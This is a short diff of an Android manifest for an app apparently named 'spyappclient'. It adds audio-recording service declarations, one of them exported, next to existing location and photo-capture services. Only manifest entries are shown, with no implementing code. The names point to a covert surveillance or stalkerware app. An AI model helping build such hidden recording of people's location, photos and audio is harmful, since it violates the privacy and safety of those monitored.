@@ -17,12 +17,17 @@
             </intent-filter>
         </activity>
         <service android:name="com.example.alber.spyappclient.LocationService"/>
+        <service android:name=".AudioRecordService"/>
         <service
             android:name=".CapturePhoto"
             android:enabled="true"
             android:exported="true">
         </service>
 
+        <service android:name=".RecordAudio"
+            android:enabled="true"
+            android:exported="true">
+        </service>
 
         <service
             android:name=".PhotoService"
